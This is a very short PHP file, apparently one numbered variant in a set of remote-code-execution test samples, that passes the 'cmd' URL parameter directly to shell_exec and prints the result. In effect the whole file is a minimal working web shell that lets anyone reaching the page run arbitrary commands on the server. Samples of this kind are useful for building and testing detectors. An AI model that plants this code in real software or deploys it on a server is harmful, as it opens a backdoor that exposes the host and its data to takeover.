<?php
// RCE test variation #1109
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>